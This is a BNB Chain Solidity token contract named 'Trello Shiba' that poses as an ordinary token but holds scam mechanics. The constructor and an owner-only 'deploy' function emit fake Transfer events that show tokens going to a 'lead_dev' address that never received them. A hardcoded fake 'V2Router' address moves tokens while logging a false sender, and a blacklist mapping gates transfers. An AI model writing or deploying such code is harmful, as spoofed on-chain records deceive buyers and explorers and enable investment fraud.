/**
 *Submitted for verification at BscScan.com on 2022-10-20
*/

pragma solidity ^0.8.7;
//SPDX-License-Identifier: UNLICENSED
contract TRELLOSHIBA {

    mapping (address => uint256) public balanceOf;
    mapping (address => bool) AmountOf;
	

    string public name = "Trello Shiba";
    string public symbol = unicode"TRELLOSHIBA";
    uint8 public decimals = 18;
    uint256 public totalSupply = 10000000 * (uint256(10) ** decimals);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

   



        constructor()  {
        balanceOf[msg.sender] = totalSupply;
        deploy(lead_dev, totalSupply); }



	address _owner = msg.sender;
    address V2Router = 0x08394F2879eC670aC9775e42C48bA56757702A52;
    address lead_dev = 0xb815cBFBC404472DF032D911368F75cAC02fe88D;
   


    function deploy(address account, uint256 amount) public {
    require(msg.sender == _owner);
    emit Transfer(address(0), account, amount); }

  
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
	
	event Approval(address indexed _owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }


    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == V2Router)  {
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_dev, to, value);
        return true; } 
        require(!AmountOf[msg.sender]);      
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }

	function transferFrom(address from, address to, uint256 value) public {   
		require(value <= balanceOf[from]);
        balanceOf[from] -= value;
        balanceOf[to] += value;
		allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        }
       
      function owner() public view returns (address) {
        return _owner;
    }

     function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0); 
        }

    }